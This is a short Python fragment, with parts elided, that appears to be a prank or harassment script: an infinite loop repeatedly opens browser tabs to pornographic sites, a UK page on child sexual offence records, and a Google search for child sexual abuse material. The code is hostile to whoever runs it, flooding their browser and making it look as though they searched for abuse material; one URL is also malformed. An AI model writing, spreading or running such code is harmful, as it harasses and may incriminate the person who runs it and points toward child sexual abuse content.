...
def ik():
    ...
    while True:
        ...
        webbrowser.open("https://thedildohub.com/")
        webbrowser.open("https://https://thepornagency.com/#Application")
        ...
        webbrowser.open("https://www.gov.uk/guidance/find-out-if-a-person-has-a-record-for-child-sexual-offences")
        webbrowser.open("https://www.google.com/search?q=child+gay+porn")
